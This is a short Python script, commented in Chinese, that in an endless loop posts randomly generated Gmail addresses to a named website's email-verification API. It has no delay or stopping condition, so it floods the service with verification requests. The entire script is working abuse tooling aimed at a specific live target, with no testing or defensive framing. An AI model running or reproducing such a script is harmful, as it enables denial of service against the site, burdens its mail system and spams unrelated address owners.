import threading
from queue import Queue
import requests
import random
import string
import threading
def generate_random_string(length=10):
    # 定义可用的字符集，包括数字和字母
    characters = string.ascii_letters + string.digits
    # 使用random.choices()函数从字符集中随机选择指定长度的字符
    random_string = ''.join(random.choices(characters, k=length))
    return random_string

url = 'https://www.tangu.link/api/v1/passport/comm/sendEmailVerify'

while True:
    email_num = generate_random_string()
    email = email_num + '@gmail.com'

    data = {
        'email' : email
    }
    r = requests.post(url=url,data=data)
    print(r,email)

